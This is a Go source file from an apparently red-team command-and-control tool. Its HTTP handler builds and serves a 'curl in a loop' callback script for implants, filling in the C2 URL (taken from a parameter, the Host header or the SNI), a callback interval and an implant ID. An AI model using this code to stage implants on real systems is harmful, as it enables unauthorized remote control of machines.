package clgen

/*
 * handler.go
 * Serve up the template
 * By J. Stuart McMurray
 * Created 20230726
 * Last Modified 20230807
 */

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/magisterquis/plonk/internal/lib"
	"golang.org/x/net/idna"
)

/* URL protocol prefixes. */
const (
	httpPrefix        = "http://"
	httpsPrefix       = "https://"
	pseudoHTTPPrefix  = "http-"  /* Turns into http:// */
	pseudoHTTPSPrefix = "https-" /* Turns into https:// */
)

// defaultCallbackInterval is the parsed form of the compile-time-settable
// CallbackInterval.
var defaultCallbackInterval int

func init() {
	/* Get the number of seconds in the default callback interval. */
	var err error
	defaultCallbackInterval, err = parseCallbackInterval(CallbackInterval)
	if nil != err {
		panic(fmt.Sprintf(
			"invalid default callback interval %q: %s",
			CallbackInterval,
			err,
		))
	}
}

// Handler handles requests for a curl in a loop script.  This must not be
// called before Init() is called and returns.
func Handler(w http.ResponseWriter, req *http.Request) {
	params := templateParams{
		RandN:    strconv.FormatUint(rand.Uint64(), 36),
		Interval: defaultCallbackInterval,
	}

	/* Work out the C2URL.  We try a query/form parameter, the Host:
	header, and the SNI, in that order. */
	var err error
	params.URL, err = getParam(req, C2URLParam)
	if nil != err {
		lib.RLogf(
			req,
			string(MessageTypeCLGen),
			"Error extracting callback URL (%s): %s",
			C2URLParam,
			err,
		)
		return
	}

	/* Failing that, try the Host: header. */
	if "" == params.URL && "" != req.Host {
		a, err := idna.ToASCII(req.Host)
		if nil != err {
			lib.RLogf(
				req,
				string(MessageTypeCLGen),
				"Error punycoding %q: %s",
				req.Host,
				err,
			)
			return
		}
		params.URL = a
	}

	/* No Host: header.  Probably HTTP/1.0.  Try the SNI. */
	if "" == params.URL && nil != req.TLS && "" != req.TLS.ServerName {
		params.URL = req.TLS.ServerName
	}

	/* Out of ideas at this point. */
	if "" == params.URL {
		lib.RLog(
			req,
			string(MessageTypeCLGen),
			"Unable to find C2 URL",
		)
		return
	}

	/* Try to get a Callback interval as well. */
	cbs, err := getParam(req, IntervalParam)
	if nil != err {
		lib.RLogf(
			req,
			string(MessageTypeCLGen),
			"Error extracting callback interval (%s): %s",
			IntervalParam,
			err,
		)
		return
	}
	if "" != cbs {
		if params.Interval, err = parseCallbackInterval(
			cbs,
		); nil != err {
			lib.RLogf(
				req,
				string(MessageTypeCLGen),
				"Error parsing callback interval %q: %s",
				cbs,
				err,
			)
		}
	}

	/* Turns out it's not easy to switch protocols, so we have a way to
	fake it that looks DNSish. */
	rep := func(o, n string) {
		if strings.HasPrefix(params.URL, o) {
			params.URL = n + strings.TrimPrefix(params.URL, o)
		}
	}
	rep(pseudoHTTPPrefix, httpPrefix)
	rep(pseudoHTTPSPrefix, httpsPrefix)

	/* Make sure we have a protocol.  We use whatever the request was sent
	as. */
	if !strings.HasPrefix(params.URL, httpPrefix) &&
		!strings.HasPrefix(params.URL, httpsPrefix) {
		if nil != req.TLS {
			params.URL = httpsPrefix + params.URL
		} else {
			params.URL = httpPrefix + params.URL
		}
	}

	/* We'll add our own slashes in the template. */
	params.URL = strings.TrimRight(params.URL, "/")

	/* Get the ImplantID, if it was given.  This one's fairly easy. */
	if params.ID, err = getParam(req, IDParam); nil != err {
		lib.RLogf(
			req,
			string(MessageTypeCLGen),
			"Error extracting ImplantID (%s): %s",
			IDParam,
			err,
		)
		return
	}

	/* Actually execute the template. */
	var buf bytes.Buffer
	cTemplateL.RLock()
	defer cTemplateL.RUnlock()
	if err := cTemplate.Execute(&buf, params); nil != err {
		lib.RLogf(
			req,
			string(MessageTypeCLGen),
			"Error generating script: %s",
			err,
		)
		return
	}

	/* Send it back to the client. */
	l := buf.Len()
	if n, err := buf.WriteTo(w); nil != err {
		lib.RLogf(
			req,
			string(MessageTypeCLGen),
			"Error sending back script after %d/%d bytes: %s",
			n,
			l,
			err,
		)
		return
	}

	lib.RLogJSON(
		req,
		string(MessageTypeCLGen),
		params,
	)
}

// getParam gets the value for the parameter p, which may be a query parameter,
// a POST parameter, or a header name.  It returns the empty string if not
// found.
func getParam(req *http.Request, p string) (string, error) {
	/* Parse the query and form and try to get it from there. */
	if err := req.ParseForm(); nil != err {
		return "", fmt.Errorf("parsing request: %w", err)
	}
	if v := req.Form.Get(p); "" != v {
		return v, nil
	}

	/* Try to get it as a header. */
	return req.Header.Get(p), nil
}

// parseCallbackInterval parses a stringy time.Duration into an integer number
// of seconds, rounding down.
func parseCallbackInterval(s string) (int, error) {
	d, err := time.ParseDuration(s)
	if nil != err {
		return 0, err
	}
	return int(d.Seconds()), nil
}
